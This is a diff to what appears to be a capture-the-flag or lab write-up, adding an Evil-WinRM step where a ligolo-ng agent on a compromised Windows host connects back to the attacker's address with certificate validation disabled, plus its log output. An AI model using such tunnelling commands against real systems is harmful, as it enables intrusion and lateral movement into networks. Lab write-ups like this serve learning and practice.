@@ -387,6 +387,16 @@ ligolo-ng »
 Ill then start the proxy on my system
 
 ```python
+*Evil-WinRM* PS C:\Users\l.wilson_adm\Documents> .\agent.exe -connect 10.10.14.61:11601 --retry --ignore-cert
+agent.exe : time="2026-11-09T20:31:32-08:00" level=warning msg="warning, certificate validation disabled"
+    + CategoryInfo          : NotSpecified: (time="2026-11-0...ation disabled":String) [], RemoteException
+    + FullyQualifiedErrorId : NativeCommandError
+time="2026-11-09T20:31:32-08:00" level=info msg="Connection established" addr="10.10.14.61:11601"
+```
+
+Ill then connect the agent back to me
+
+```python
 
 ```
 
